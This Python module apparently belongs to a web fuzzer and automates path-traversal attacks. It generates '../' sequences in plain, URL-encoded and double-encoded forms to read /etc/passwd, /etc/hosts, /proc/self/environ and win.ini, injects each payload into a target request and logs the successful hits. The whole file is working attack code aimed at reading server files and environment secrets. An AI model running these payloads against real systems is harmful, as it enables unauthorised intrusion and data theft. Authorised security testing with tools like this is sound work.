from ..requester import requester
from ..inject import injectPayload
from ..utils import reader, formater
from ..analyzers.traversal import analyze_traversal
import logging

logger = logging.getLogger("webfuzz")

def obfuscate_payload(file, diff=8):
    payloads = [file]
    file = file.split('/',1)[1] if file.startswith('/') else file
    d = ["../"] * diff
    d = "".join(d)
    payloads.append(d+file)
    one_encode = d.replace("../","%2e%2e%2f")
    payloads.append(one_encode+file)
    two_encode = one_encode.replace("%2e%2e%2f","%252e%252e%252f")
    payloads.append(two_encode+file)
    return payloads

def fuzz_traversal(wordlist, location, url, headers, data, method):
    wordlist = wordlist if wordlist else "wordlists/traversal.txt"
    payloads = reader(wordlist)
    files = ["/etc/passwd", "/etc/hosts", "/proc/self/environ", "windows/win.ini"]
    MAX_SHOW = 4
    hits = 0
    for file in files:
        payloads += obfuscate_payload(file)
    for payload in payloads:
        new_url, new_headers, new_data = injectPayload(location, url, headers, data, payload)
        response = requester(new_url, new_headers, new_data, method)
        res = analyze_traversal(response.text)
        if res is not None:
            msg = formater("TRAVERSAL.hit", payload=payload, evidence=res.get("evidence"), status=response.status_code)
            if hits < MAX_SHOW:
                hits += 1
                logger.vuln(msg)
            else:
                logger.vuln_to_file(msg)
                hits += 1

    if not hits:
        logger.info("Traversal: no payload matched (0 hits)")
    else:
        logger.newline()
        logger.info(f"TRAVERSAL: {hits} hits (showing {MAX_SHOW if hits > MAX_SHOW else hits})")
    if hits > MAX_SHOW:
        print("[INFO] See --log-file for full list hit payloads")
            
        

    
